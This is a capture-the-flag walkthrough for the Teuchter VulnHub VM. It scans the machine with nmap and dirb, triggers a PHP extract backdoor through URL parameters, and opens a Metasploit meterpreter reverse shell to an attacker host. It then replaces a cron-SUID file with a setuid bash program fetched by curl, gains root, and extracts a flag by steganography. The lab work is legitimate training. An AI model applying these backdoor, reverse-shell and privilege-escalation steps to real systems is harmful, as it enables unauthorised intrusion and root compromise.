@@ -1,0 +1,162 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Teuchter VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-teuchter-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-17T09:29:47+00:00">July 17, 2018</time><time class="updated" datetime="2025-06-10T20:29:46+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This post is on the latest CTF challenge “Teuchter” presented by vulnhub for penetration practice and design by knightmare. This virtual machine is having intermediate to the medium difficulty level. One need to break into VM using the web application and from there escalate privileges to gain root access.</span></p>
+<p><span style="color: #000000;">Download it from here:<span style="color: #3366ff;"> https://www.vulnhub.com/entry/teuchter-03,163/</span></span></p>
+<p><span style="color: #000000;"><strong>Penetrating Methodologies </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network Scanning (netdiscover, Nmap)</span></li>
+<li><span style="color: #000000;">Abusing HTTP service for PHP extract backdoor</span></li>
+<li><span style="color: #000000;">Compromise victim’s (Metasploit)</span></li>
+<li><span style="color: #000000;">SUID Privilege escalation</span></li>
+<li><span style="color: #000000;">Steganography for original flag.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Lets Start!!!</strong></span></p>
+<p><span style="color: #000000;">Let’s start with getting to know the IP of VM (Here, I have it at 192.168.1.104 but you will have to find your own)</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2dDT8yGjv9Q/W02wcBbY2UI/AAAAAAAAYPc/XEmEPw4IRyc__NvLPEJu1UpR0xCBdtPCwCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.</span></p>
+<pre class="lang:default decode:true ">nmap -A 192.168.1.104</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8xw8vgta5ZI/W02weUDBE1I/AAAAAAAAYRg/ezWlr8Lf2PEYwij9HJoMExJCJSRNiztigCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Knowing port 80 is open in the victim’s network I preferred to explore his IP in a browser. At first glance, we saw following web page.  When couldn’t found something suspicious, so we try to check its source-code</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--sZt5IuK3u0/W02wepkk2YI/AAAAAAAAYRM/A1vsxQE3wSsqnOTtZEWgayjGJLofnoZwACEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Hmmm!! After exploring the source code page, you can analysis the “Green color text” sounds a little bit doubtful. Giving priority to<em> /gallery /flicks</em> and <em>/telly</em> we have considered them as the subjective web directories and then try to explore it in the web browser.</span></p>
+<p><span style="color: #000000;">Also, consider hint given for some extension like .pht for PHP.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sMY62gD30Yw/W02wgCwF1LI/AAAAAAAAYRg/jCsvMs4yYM4YD4tA6sNC71fVoK0cAHPpACEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So I opened the URL <em>http://192.168.1.104/gallery/</em> but couldn’t get anything neither from its web page nor from its source code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pRNkKLGqqwA/W02wgbawAXI/AAAAAAAAYRc/skrvF_rFIlEfif3VLi7fz7WiUg7QcCjswCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then explored the URL <em>http://192.168.1.104/telly/</em> and it put-up following web page in front of us and at looking at its page source code we notice something like <em>flicks phpinfo.</em></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-d0KNklZqzTU/W02wgiBAMMI/AAAAAAAAYRc/CeN4qiaJaJY4rf8SIxX3HxKKww8k2-4vgCEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">So without wasting time, we lunch directory brute-force attack on the following URL for identifying .php and .pht extension files.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.104/flicks/ -X .php,.pht</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-t4YahpioIhg/W02wgkKtUbI/AAAAAAAAYRc/KVYzQ1bzuFY9DamtLPttkWByQYw-AlTiQCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">And from its result, we find a phpinfo.pht file and explored it in the browser and it gives me an internal server error when I open it. So I search in Google phpinfo.php found this link: <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html</a></span></span></p>
+<p><span style="color: #000000;">Thanks to Mr. Daniel B. Cid for sharing his experience because with help of above link we get the idea to exploit it. As the author has hidden the PHP extract backdoor inside the phpinfo.pht file and now whatever the attacker sends as “ctime” with “atime” as an argument it will be executed successfully.</span></p>
+<p><span style="color: #000000;">As you can observe when we try to execute the system command “id” through the given below URL we got following result on the web page.</span></p>
+<pre class="lang:default decode:true">192.168.1.104/flicks/phpinfo.php?ctime=system&amp;atime=id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KJdqYiJXlqg/W02wguFP4XI/AAAAAAAAYRY/DnMahMOIiKsvMdkhFYbMO96uZAxc2YciQCEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Let’s compromise the victim’s VM to get the meterpreter shell, therefore, we load the Metasploit framework and execute below commands.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set target 1
+msf exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.107
+msf exploit(multi/script/web_delivery) &gt; exploit</pre>
+<p><span style="color: #000000;">Copy the highlighted text for malicious PHP code and Paste it inside the URL as an argument.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iKt5wj7htJ0/W02whF1sIBI/AAAAAAAAYRg/JL1ad0xAR_AVTphnMtlf9CIGxzp8VO7QACEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">You will get the meterpreter session of victim’s machine in your Metasploit framework and after then finished the task by grabbing the flag.txt file. Further type following for extracting more information for post exploitation.</span></p>
+<p><span style="color: #000000;">Here first I <em>sysinfo</em> command to enumerate install kernel version but didn’t found any working exploit for this VM therefore then I decide to go with the manual approach for privilege escalation. Thus execute below commands:</span></p>
+<pre class="lang:default decode:true">cd /home
+ls
+cd proclaimers
+ls
+cd letterfromamerica
+ls</pre>
+<p><span style="color: #000000;">Here I found two files <strong>semaphore</strong> and <strong>test</strong> and if you will notice at their permissions then you will realize that SUID bit enabled for semaphore and GUID bit is enabled for test.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6l4y2iDeopQ/W02wcPbXc6I/AAAAAAAAYRQ/-GMSdcqZ7HUKa9F-_r32jGTR84ubtvZNACEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now let access proper tty shell of victim’s VM and enumerate furthermore inside it.</span></p>
+<pre class="lang:default decode:true">shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;"><em>ooh</em>!! I got something suspicious file a <strong><em>login.txt</em></strong> from inside <em>/home/jkerr</em>, <strong><em> </em></strong>and <strong><em>promisedyouamiracle.jpg</em></strong> image. And after reading the note of the login.txt file I decided to download jpg image in our local machine.</span></p>
+<p><span style="color: #000000;">Since the python 3 is already running, therefore, we execute the following command for transferring file.</span></p>
+<pre class="lang:default decode:true">python3 -m http.server 8080</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3AC48PaA1L4/W02wcP-ZDyI/AAAAAAAAYRM/31tO3YwQxCUwNwAdky9O_VK7fnOiQGcjACEwYBhgL/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">When we explored the promisedyouamiracle.jpg image in the browser we got the following photo.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-I5HK3p3sJ-8/W02wc77QoFI/AAAAAAAAYRY/9gid8evtoRE1PsYlhfSx4zsk9JcDdhRYACEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">With help of exiftool, we try to extract metadata from inside this image and luckily found the bas64 encoded text.</span></p>
+<pre class="lang:default decode:true">exiftool promisedyouamiracle.jpg</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UU1v5wek1vA/W02wc3BP_dI/AAAAAAAAYRY/kS2zBJwqv4g7u_elB-h_c2wDLmsd0NB9QCEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">With the help of the following command, we try to decode the text and got “gemini” which could be a possible password.</span></p>
+<pre class="lang:default decode:true">echo "Z2VtaW5pCg==" | base64 -d</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8x7zMlkkNww/W02wc63t2KI/AAAAAAAAYRc/KIzZ_unUFCsVvSStp8xFwHByjlS21kDYACEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Let try to login by using gemini as a password for user: proclaimers because it holds two important files. Execute the following commands and extract the information.</span></p>
+<pre class="lang:default decode:true">su proclaimers
+password: gemini
+ls
+cd proclaimers
+ls
+cd letterfromamerica
+ls -al</pre>
+<p><span style="color: #000000;">Oh Great!! As declared above SUID bit enabled for the <em>semaphore</em> and GUID bit enabled for the <em>test</em>, let’s use <em>grep command</em> to get everything related to <em>semaphore.</em></span></p>
+<pre class="lang:default decode:true">grep -R "semaphore" /usr/local 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">Awesome, I got a script at this path /usr/local/bin/numpties.sh; let’s open it with cat command.</span></p>
+<pre class="lang:default decode:true">cat /usr/local/bin/numpties.sh</pre>
+<p><span style="color: #000000;">After reading it, I conclude that <strong><em>the cronjob will add the SUID bit to semaphore and also give root ownership to this file if the file exists</em></strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zAPatABjXNQ/W02wda1I5CI/AAAAAAAAYRg/qzTdWbx6S9o5ZDNqR7g0jG2rJbcnFrOswCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">No wonder, if I replace the original semaphore by the fake semaphore file then our fake file will get SUID permission. So in our local, we write a C-program to get bash shell and compile it.</span></p>
+<pre class="lang:default decode:true">include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+Int main ()
+{
+setuid(geteuid ());
+system("/bin/bash");
+}</pre>
+<pre class="lang:default decode:true">gcc shell.c -o semaphore
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-cvB0dBSA3YY/W02wdVsktQI/AAAAAAAAYRg/JnxJ6e7ja1UF3Kl6hx1ZJGKILGkrsECxwCEwYBhgL/s1600/16.1.png"/></strong></span></p>
+<p><span style="color: #000000;">Since we have compiled file semaphores and also running python server, therefore, let’s download our fake semaphore at the place of original semaphores. Thus first I removed original semaphores and download compiled file in the same directory.</span></p>
+<pre class="lang:default decode:true">rm -rf  semaphore
+curl -O http://192.168.1.107/semaphore</pre>
+<p><span style="color: #000000;">After sometime when I checked the permission for the new semaphore I found the SUID bit was on. At that moment you should run the script which will give root terminal after getting executed and then look for flag inside /root directory.</span></p>
+<pre class="lang:default decode:true">ls -la
+./semaphore
+cd /root
+cat flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-C-5QADXpmuw/W02wddhGadI/AAAAAAAAYRU/xU5Phm8YDHUfJQZJHCRpfLkNlSGzS_sWACEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">This was not actual flag let’s try to get the original flag </span></p>
+<pre class="lang:default decode:true">cd root
+ls
+re-record-not-fade-away
+ls -al
+cd on
+ls 
+cd and
+ls
+cd on</pre>
+<p><span style="color: #000000;">So on………… and at last you will get /ariston which is holding a zip file “TeuchterESX.zip”.</span></p>
+<pre class="lang:default decode:true">cd ariston</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RfheiPW0QkM/W02wd3ezLrI/AAAAAAAAYRg/LEm0SS5usDAF_Yp_pQnQIbsNZzwlpqxLACEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Again run the following command in the current directory to transfer zip file.</span></p>
+<pre class="lang:default decode:true">python3 -m http.server 8080</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2xU4vDbKTxw/W02weHAgjaI/AAAAAAAAYRc/CHbOqBRnYeElYpHILYP1_Ap_kcdjAJBvwCEwYBhgL/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Now download TeuchterESX.zip file in local machine and unzip it.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.103:8080/TeuchterESX.zip
+unzip TeuchterESX.zip
+password: Teuchter</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SMd7IAqjDMA/W02weQUFlQI/AAAAAAAAYRQ/b57CsjGVT-Ufr2WDxVciHeNxshaq98OXwCEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">We got a vmdk file and further I run following command to the list of present drive for mounting disk image.</span></p>
+<pre class="lang:default decode:true">fdisk -l</pre>
+<p><span style="color: #000000;">Here we saw /dev/sdb1 which looks good mounting disk image thus I install the vmfs-tools package.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-s7AwUlWDiEs/W02we3ej75I/AAAAAAAAYRg/B79m7W_YfVsPFwfnY5ZlqmzAlDHSePdpACEwYBhgL/s1600/30.png"/></span></p>
+<p><span style="color: #000000;">So we have used vmfs-fuse to mount the drive and execute the following commands:</span></p>
+<pre class="lang:default decode:true">mkdir Teuchter
+vmfs-fuse /dev/sdb1 /root/Desktop/Teuchter/
+cd Teuchter
+ls
+cat hint.txt
+cd redkola</pre>
+<p><span style="color: #000000;">In this text messages the author had given hint to check ISO for getting the password which is related to TV advert and it’s of 25 characters.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DqSQBN8Fovo/W02we6XR1aI/AAAAAAAAYRQ/dtrPivWB0FQbJ6vRKwYjeBG1jgNRPx4uACEwYBhgL/s1600/31.png"/></span></p>
+<p><span style="color: #000000;">So we mount the new folder /redkola.iso where we found an image file <em>glass_ch.jpg</em> with help of the following command:</span></p>
+<pre class="lang:default decode:true">mount redkola.iso /root/Desktop/redkola
+cd /root/Desktop/redkola
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-FXtsV4k6Dc8/W02wfH00IlI/AAAAAAAAYRI/Trg3U_NSjFwvm3nz5X8jzV7cuhnuz3ruwCEwYBhgL/s1600/32.1.png"/></span></p>
+<p><span style="color: #000000;">Further, we opened the image “glass_ch.jpg” and it was a picture of <em>Irn-Bru soft-drinks</em>. Probably there could be chances of hidden text in this image, therefore, we tried steghide to extract out hidden text but when I execute the following command it asks to enter some <strong><em>passphrase</em></strong> which we don’t know yet and it should above said 25 characters which we need to be found.</span></p>
+<pre class="lang:default decode:true">steghide extract -sf glass_ch.jpg -xf /root/Desktop/finalflag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EqFMpuokuhk/W02wfppVi-I/AAAAAAAAYRQ/Hx82igxL8Fsx1evLIGdqg0Zmh55mpQQBQCEwYBhgL/s1600/32.2.png"/></span></p>
+<p><span style="color: #000000;">Taking help of above hint and image I search Irn-bru-wiki and got this link <a style="color: #000000;" href="https://en.wikipedia.org/wiki/Irn-Bru"><span style="color: #3366ff;">https://en.wikipedia.org/wiki/Irn-Bru</span></a></span></p>
+<p><span style="color: #000000;">And after spending a long time over wiki I got 25 characters in ‘madeinscotlandfromgirders’, which was Irn-Bru advertising slogan and tried it as the passphrase.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MJqwEAJfGE4/W02wfSTOacI/AAAAAAAAYRY/coac2sabYLoPbFHPDyi5Y5i7pxmw8mW2wCEwYBhgL/s1600/32.png"/></span></p>
+<p><span style="color: #000000;">We entered the above passphrase and extracted the text file on the desktop.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bvajwIPf2Rw/W02wfosJOXI/AAAAAAAAYRc/oH2p4TQs5TkwduLYqDbP__U6TMXmWlmkgCEwYBhgL/s1600/33.png"/></span></p>
+<p><span style="color: #000000;">Congrats!! Finally, we got the final flag.txt</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
